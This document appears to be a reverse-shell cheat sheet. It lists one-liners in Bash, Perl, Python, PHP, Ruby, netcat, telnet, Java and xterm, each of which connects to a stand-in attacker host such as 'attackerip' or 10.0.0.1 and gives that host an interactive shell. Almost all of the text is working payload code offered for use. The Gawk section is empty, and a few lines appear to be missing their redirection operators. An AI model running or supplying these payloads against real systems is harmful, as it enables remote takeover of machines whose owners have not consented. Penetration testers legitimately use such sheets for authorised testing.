# Bash

```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

```
exec /bin/bash 0&0 2>&0
```

```
0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196
```

Create a new descriptor which is assigned to a network node. Then we will read and write to that descriptor (does not work in Debian):

```
exec 5<>/dev/tcp/attackerip/4444
cat <&5 | while read line; do $line 2>&5 >&5; done  
# or:
while read line 0<&5; do $line 2>&5 >&5; done
```

Banner a HTTP server using Bash:

```
#!/bin/bash
exec 3 /dev/tcp/$1/80
echo -e "Get /simple?se=1 HTTP/1.0\n" >&3
cat <&3
```

# Perl

Unix:

```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

```
# Without IO
perl -MIO::Socket -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr => "127.0.0.1:1234");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

Windows

```
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

```
# Without IO
perl -MIO::Socket -e '$c=new IO::Socket::INET(PeerAddr => "127.0.0.1:1234");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

```
print $sock eval(<$sock>) while ($sock ||= IO::Socket::INET->new(PeerAddr => "127.0.0.1", PeerPort => "23666"))
```

# Python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

# PHP

```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```
<?php $sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

# Ruby

Unix

```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

Windows

```
ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

# NetCat

```
nc -e /bin/sh 10.0.0.1 1234
```

```
nc -c /bin/sh 10.0.0.1 1234
```

```
/bin/sh | nc attackerip 4444
```

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

```
rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/p 2>&1
```

Two connections:

```
nc localhost 1233 | /bin/sh | nc 127.0.0.1 1234
```

# Telnet

```
rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p 2>&1
```

```
telnet attackerip 4444 | /bin/bash | telnet attackerip 4445   # Remember to listen on your machine also on port 4445/tcp
```

# Java

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

# Xterm

```
xterm -display attackerip:1
# Or:
DISPLAY=attackerip:0 xterm
```

On solaris `/usr/openwin/bin/xterm -display attackerip:1`

```
Xnest :1
xterm -display 127.0.0.1:1  # Run this OUTSIDE the Xnest
xhost +targetip             # Run this INSIDE the spawned xterm on the open X Server
```

# Gawk

``

# References

- <http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>

- <https://www.gnucitizen.org/blog/reverse-shell-with-bash>
